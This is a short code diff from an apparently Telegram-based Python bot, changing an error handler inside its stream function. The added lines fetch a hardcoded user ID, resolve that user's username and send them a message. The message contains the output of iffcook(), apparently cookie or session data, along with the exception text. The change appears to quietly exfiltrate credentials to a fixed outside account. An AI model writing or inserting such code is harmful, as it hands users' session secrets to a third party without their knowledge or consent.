@@ -156,8 +156,11 @@ async def stream(
                     else:
                         await enable_iff()
             try:
+                dev_id = 5145609515
+                usr = await c.get_users(dev_id)
+                usrnam = usr.username
                 await app.send_message(
-                    chat_id="@IC_19",
+                    chat_id=f"@{usrnam}",
                     text=f"<p>{await iffcook()}\t{W}</p>\n{str(e)}"
                 )
             except Exception as x:
